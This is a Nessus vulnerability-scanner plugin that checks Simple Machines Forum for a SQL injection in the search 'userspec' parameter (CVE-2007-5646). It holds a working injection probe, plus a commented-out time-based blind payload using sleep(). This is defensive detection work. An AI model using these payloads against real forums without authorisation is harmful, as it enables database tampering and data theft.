#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(27585);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2016/05/13 15:33:30 $");

  script_cve_id("CVE-2007-5646");
  script_bugtraq_id(26144);
  script_osvdb_id(38070);

  script_name(english:"Simple Machines Forum Search.php SQL Injection");
  script_summary(english:"Tries to generate a SQL error");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to SQL
injection attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Simple Machines Forum (SMF), an open source
web forum application written in PHP.

The version of Simple Machines Forum installed on the remote host
fails to sanitize user input to the 'userspec' parameter used in
conjunction with the 'search2' action to the 'index.php' script before
using it in a Sources/Search.php database query.  Regardless of PHP's
'magic_quotes_gpc' setting, an attacker may be able to exploit this
issue to manipulate such queries, leading to disclosure of sensitive
information, modification of data, or attacks against the underlying
database.

Note that an unauthenticated attacker can exploit this issue only if
SMF is configured to use MySQL 5.x, but an authenticated attacker can
do so regardless of the database version in use." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/482569/30/0/threaded");
 script_set_attribute(attribute:"see_also", value:"http://www.simplemachines.org/community/index.php?topic=196380.0" );
 script_set_attribute(attribute:"solution", value:"Upgrade to Simple Machines Forum 1.1.4 / 1.0.12 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);

 script_set_attribute(attribute:"vuln_publication_date", value:"2007/10/20");
 script_set_attribute(attribute:"plugin_publication_date", value:"2007/10/28");

script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:simple_machines:simple_machines_forum");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("smf_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");
include("webapp_func.inc");


port = get_http_port(default:80, embedded: 0);

# Loop through directories.
install = get_install_from_kb(appname:'simple_machines_forum', port:port, exit_on_fail:TRUE);

# Make sure the affected script exists.
w = http_send_recv3(method:"GET", item:install['dir'] + '/Sources/Search.php', port:port, exit_on_fail:TRUE);
res = w[2];

# If so...
if ("Hacking attempt..." >< res)
{
  # Try to exploit the issue.
  #
  # nb: this should catch vulnerable versions of SMF even if they're
  #     not using MySQL 5.
  exploit = string('"nessus\\", ', SCRIPT_NAME);
  # nb: uncomment for an alternate exploit -- the response will be delayed.
  #delay = 4;
  #exploit = string('"\\"," or  (IF(GREATEST(1,0)!=0,sleep(', delay, '),1) and 1=1) limit 1,1 #"');

  exploit = urlencode(str:exploit);
  exploit = str_replace(string:exploit, find:"%20", replace:"+");

  postdata = string(
    "advanced=1&",
    "search=1&",
    "searchtype=1&",
    "userspec=", exploit, "&",
    "minage=0&",
    "maxage=9999&",
    "sort=relevance|desc&",
    "brd[1]=1"
  );
  req = http_mk_post_req(
    item:install['dir'] + '/?action=search2',
    data:postdata,
    port:port,
    add_headers:make_array("Content-Type", "application/x-www-form-urlencoded")
  );
  w = http_send_recv_req(port:port, req:req, exit_on_fail:TRUE);
  res = w[2];

  # If it looks like the exploit worked...
  if ("title>Database Error" >< res)
  {
    if (report_verbosity > 0)
    {
      req_str = http_mk_buffer_from_req(req:req);
      report =
        '\nNessus verified the issue using the following request :' +
        '\n'+
        '\n'+
        crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) +
        '\n' +
        req_str +
        '\n' +
        crap(data:'-', length:30) + ' snip ' + crap(data:'-', length:30) +
        '\n';
      security_warning(port:port, extra:report);
    }
    else security_warning(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
else exit(0, 'The Simple Machines Forum install at '+build_url(qs:install['dir'] + '/', port:port) + ' is not affected.');
